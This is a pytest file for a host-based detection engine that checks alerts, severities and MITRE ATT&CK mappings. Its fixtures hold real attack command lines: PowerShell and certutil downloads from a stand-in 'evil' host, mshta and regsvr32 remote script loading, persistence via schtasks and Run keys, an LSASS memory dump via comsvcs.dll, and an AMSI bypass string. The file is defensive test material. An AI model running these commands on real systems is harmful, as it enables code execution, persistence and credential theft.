"""
Tests for the spec detection engine (engine.detection_engine).
"""

from __future__ import annotations

import uuid

import pytest

from engine import detection_engine, mitre_mapper
from engine.detection_engine import DetectionEngine, Rule


def _ev(**kw) -> dict:
    base = {
        "event_id": str(uuid.uuid4()),
        "host_id": "h1",
        "timestamp": "2026-04-27T12:00:00Z",
        "event_type": "process_execution",
        "severity": "low",
        "process_name": "",
        "command_line": "",
    }
    base.update(kw)
    return base


def test_powershell_encoded_command_detected():
    e = _ev(
        event_type="process_execution",
        process_name="powershell.exe",
        command_line='powershell.exe -nop -enc SQB3AHIAIA==dummylongbase64payload==',
    )
    alerts = detection_engine.evaluate([e])
    rule_ids = {a.rule_id for a in alerts}
    assert "NG-EXEC-PS-ENC-001" in rule_ids
    a = next(a for a in alerts if a.rule_id == "NG-EXEC-PS-ENC-001")
    assert a.severity == "high"
    assert a.mitre_tactic == "Defense Evasion"
    assert a.mitre_technique.startswith("T1027")


def test_powershell_download_detected():
    e = _ev(
        process_name="powershell.exe",
        command_line='powershell -c "iex (New-Object Net.WebClient).DownloadString(\'http://evil/a.ps1\')"',
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-EXEC-PS-DL-001" for a in alerts)


def test_certutil_url_cache():
    e = _ev(
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil/x.exe payload.exe",
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-LOLBIN-CERTUTIL-001" for a in alerts)


def test_mshta_remote_script():
    e = _ev(
        process_name="mshta.exe",
        command_line="mshta.exe http://evil/launch.hta",
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-LOLBIN-MSHTA-001" for a in alerts)


def test_rundll32_javascript():
    e = _ev(
        process_name="rundll32.exe",
        command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "',
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-LOLBIN-RUNDLL32-001" for a in alerts)


def test_regsvr32_squiblydoo():
    e = _ev(
        process_name="regsvr32.exe",
        command_line="regsvr32 /s /u /i:http://evil/x.sct scrobj.dll",
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-LOLBIN-REGSVR32-001" for a in alerts)


def test_schtasks_persistence():
    e = _ev(
        process_name="schtasks.exe",
        command_line="schtasks /create /tn Updater /tr c:\\bad.exe /sc onlogon",
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-PERSIST-SCHTASKS-001" for a in alerts)


def test_reg_run_persistence_high():
    e = _ev(
        process_name="reg.exe",
        command_line='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v X /t REG_SZ /d c:\\m.exe /f',
    )
    alerts = detection_engine.evaluate([e])
    a = next(a for a in alerts if a.rule_id == "NG-PERSIST-REG-RUN-001")
    assert a.severity == "high"
    assert a.mitre_technique == "T1547.001"


def test_office_spawning_shell_critical():
    e = _ev(
        process_name="powershell.exe",
        command_line="powershell -c whoami",
        raw={"parent_process": "winword.exe"},
    )
    alerts = detection_engine.evaluate([e])
    crit = [a for a in alerts if a.rule_id == "NG-EXEC-OFFICE-SHELL-001"]
    assert crit, "office→shell rule should fire"
    assert crit[0].severity == "critical"


def test_lsass_dump_critical():
    e = _ev(
        process_name="rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 700 lsass.dmp full",
    )
    alerts = detection_engine.evaluate([e])
    a = next(a for a in alerts if a.rule_id == "NG-CRED-LSASS-001")
    assert a.severity == "critical"


def test_amsi_bypass_pattern():
    e = _ev(
        process_name="powershell.exe",
        command_line="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
    )
    alerts = detection_engine.evaluate([e])
    assert any(a.rule_id == "NG-EVASION-AMSI-001" for a in alerts)


def test_rare_outbound_port_only_for_shells():
    # shell process → fires
    e1 = _ev(
        event_type="network_connection",
        process_name="powershell.exe",
        dst_ip="203.0.113.5", dst_port=4242,
    )
    a1 = detection_engine.evaluate([e1])
    assert any(a.rule_id == "NG-NET-RARE-PORT-001" for a in a1)

    # benign process → silent
    e2 = _ev(
        event_type="network_connection",
        process_name="chrome.exe",
        dst_ip="203.0.113.5", dst_port=4242,
    )
    a2 = detection_engine.evaluate([e2])
    assert not any(a.rule_id == "NG-NET-RARE-PORT-001" for a in a2)

    # common port → silent even for shells
    e3 = _ev(
        event_type="network_connection",
        process_name="powershell.exe",
        dst_ip="203.0.113.5", dst_port=8080,
    )
    a3 = detection_engine.evaluate([e3])
    assert not any(a.rule_id == "NG-NET-RARE-PORT-001" for a in a3)


def test_no_alerts_on_benign_event():
    e = _ev(
        process_name="notepad.exe",
        command_line="notepad.exe C:\\users\\me\\file.txt",
    )
    assert detection_engine.evaluate([e]) == []


def test_alert_includes_event_id():
    e = _ev(
        event_id="known-event-7",
        process_name="powershell.exe",
        command_line='powershell -enc SQB3AHIAaaaaaaaaaaaaaaaa',
    )
    alerts = detection_engine.evaluate([e])
    assert alerts
    assert alerts[0].event_ids == ["known-event-7"]


def test_register_rule_dedups_id():
    eng = DetectionEngine()
    new_rule = Rule(
        rule_id="NG-EXEC-PS-ENC-001",  # same as built-in
        title="dup",
        severity="low",
        confidence=0,
        mitre_technique="T1059",
        description="x",
        matcher=lambda ev: (False, ""),
    )
    with pytest.raises(ValueError, match="duplicate"):
        eng.register_rule(new_rule)


def test_custom_rule_works():
    eng = DetectionEngine()
    eng.register_rule(Rule(
        rule_id="CUSTOM-1",
        title="any cmd starting with x",
        severity="medium",
        confidence=50,
        mitre_technique="T1059",
        description="t",
        matcher=lambda ev: (ev.command_line.startswith("xxx"), ev.command_line[:20]),
    ))
    e = _ev(command_line="xxx do something")
    alerts = eng.evaluate([e])
    assert any(a.rule_id == "CUSTOM-1" for a in alerts)


def test_mitre_mapper_resolves_subtechnique():
    assert mitre_mapper.tactic_for("T1059.001") == "Execution"
    # Unmapped subtechnique falls back to parent
    assert mitre_mapper.tactic_for("T1027.999") == "Defense Evasion"


def test_mitre_mapper_unknown_returns_unknown():
    assert mitre_mapper.tactic_for("T9999") == "Unknown"
    assert mitre_mapper.tactic_for("") == "Unknown"


def test_attack_url_builds_correctly():
    assert mitre_mapper.attack_url("T1059.001") == "https://attack.mitre.org/techniques/T1059/001/"
    assert mitre_mapper.attack_url("T1027") == "https://attack.mitre.org/techniques/T1027/"
